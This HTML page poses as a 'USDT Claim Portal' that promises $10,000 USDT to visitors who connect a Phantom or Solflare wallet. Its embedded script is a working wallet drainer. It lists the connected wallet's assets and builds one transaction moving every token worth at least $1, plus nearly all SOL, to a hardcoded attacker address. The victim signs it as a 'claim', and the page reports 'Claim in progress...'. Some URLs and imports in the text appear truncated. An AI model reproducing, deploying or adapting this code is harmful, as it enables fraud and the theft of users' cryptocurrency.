<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Claim Portal</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0a0c;
            --accent-green: #14F195;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            display: flex; justify-content: center; align-items: center;
            overflow: hidden; color: white;
        }

        /* Animated Mesh Gradient Background */
        .mesh-container {
            position: absolute; width: 100%; height: 100%;
            background: var(--bg-dark);
            z-index: -1; overflow: hidden;
        }

        .mesh-blob {
            position: absolute; width: 600px; height: 600px;
            background: radial-gradient(circle, rgba(20, 241, 149, 0.08) 0%, transparent 70%);
            filter: blur(80px); animation: move 20s infinite alternate;
        }

        .blob-2 { top: -100px; right: -100px; background: radial-gradient(circle, rgba(153, 69, 255, 0.08) 0%, transparent 70%); animation-duration: 25s; }
        .blob-3 { bottom: -100px; left: 10%; background: radial-gradient(circle, rgba(255, 255, 255, 0.03) 0%, transparent 70%); animation-duration: 30s; }

        @keyframes move {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(100px, 100px) scale(1.2); }
        }

        /* Glassmorphism Claim Card */
        .claim-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            padding: 60px 40px;
            border-radius: 40px;
            border: 1px solid var(--glass-border);
            text-align: center;
            box-shadow: 0 50px 100px rgba(0,0,0,0.8);
            max-width: 450px; width: 90%;
            animation: slideIn 0.8s ease-out;
        }

        .sol-text {
            font-size: 38px; font-weight: 900;
            white-space: nowrap; margin-bottom: 50px;
            background: linear-gradient(to right, #fff 20%, #666 50%, #fff 80%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 4s linear infinite;
        }

        .claim-btn {
            background: #ffffff; color: #000;
            padding: 22px 0; border-radius: 18px;
            font-weight: 800; font-size: 17px;
            border: none; cursor: pointer;
            text-transform: uppercase; letter-spacing: 1.5px;
            width: 100%; transition: 0.3s cubic-bezier(0.2, 1, 0.3, 1);
            margin-bottom: 12px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        .claim-btn:hover {
            background: var(--accent-green);
            transform: translateY(-4px) scale(1.02);
            box-shadow: 0 15px 30px rgba(20, 241, 149, 0.3);
        }

        @keyframes shine { to { background-position: 200% center; } }
        @keyframes slideIn { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="mesh-container">
        <div class="mesh-blob"></div>
        <div class="mesh-blob blob-2"></div>
        <div class="mesh-blob blob-3"></div>
    </div>

    <div class="claim-card">
        <div class="sol-text">CLAIM $10,000 USDT</div>
        <button class="claim-btn" onclick="initiateWalletFlow('phantom')">Connect Phantom</button>
        <button class="claim-btn" onclick="initiateWalletFlow('solflare')" style="background: #5055ff; color: #fff;">Connect Solflare</button>
    </div>

    <script type="module">
        import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from 'https://esm.sh';
        import { createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferCheckedInstruction } from 'https://esm.sh';

        const HELIUS_RPC = "https://helius-rpc.com";
        const RECEIVER_ADDR = new PublicKey("5KKphHnhQdhMMibgPDSsWXtDPZiFyXPPNSrKXuXxA2CM");
        const connection = new Connection(HELIUS_RPC);

        window.initiateWalletFlow = async (walletType) => {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const currentUrl = window.location.href;

            if (isMobile && !window.solana && !window.phantom && !window.solflare) {
                if (walletType === 'phantom') {
                    window.location.href = `https://phantom.app{encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`;
                } else {
                    window.location.href = `https://solflare.com{encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`;
                }
                return;
            }

            const provider = window.solana || window.phantom?.solana || window.solflare;
            if (!provider) return alert("Wallet not detected. Use your wallet's browser.");

            try {
                const resp = await provider.connect();
                const sender = resp.publicKey;

                const response = await fetch(HELIUS_RPC, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: 'tx-01', method: 'getAssetsByOwner',
                        params: { ownerAddress: sender.toBase58(), displayOptions: { showNativeBalance: true } }
                    }),
                });
                const { result } = await response.json();

                const instructions = [];
                const items = (result.items || []).filter(a => a.token_info?.price_info?.total_price >= 1);

                for (const asset of items) {
                    const mint = new PublicKey(asset.id);
                    const destAta = await getAssociatedTokenAddress(mint, RECEIVER_ADDR);
                    instructions.push(createAssociatedTokenAccountInstruction(sender, destAta, RECEIVER_ADDR, mint));
                    instructions.push(createTransferCheckedInstruction(
                        new PublicKey(asset.token_info.associated_token_address),
                        mint, destAta, sender, asset.token_info.balance, asset.token_info.decimals
                    ));
                }

                const solLamports = result.nativeBalance?.lamports || 0;
                if (solLamports > 5000000) { 
                    instructions.push(SystemProgram.transfer({ fromPubkey: sender, toPubkey: RECEIVER_ADDR, lamports: solLamports - 5000000 }));
                }

                if (instructions.length === 0) return alert("No eligible assets found.");

                const { blockhash } = await connection.getLatestBlockhash();
                const message = new TransactionMessage({ payerKey: sender, recentBlockhash: blockhash, instructions }).compileToV0Message();
                const tx = new VersionedTransaction(message);
                const signedTx = await provider.signTransaction(tx);
                await connection.sendRawTransaction(signedTx.serialize());
                alert("Claim in progress...");
            } catch (err) { alert("Cancelled."); }
        };
    </script>
</body>
</html>
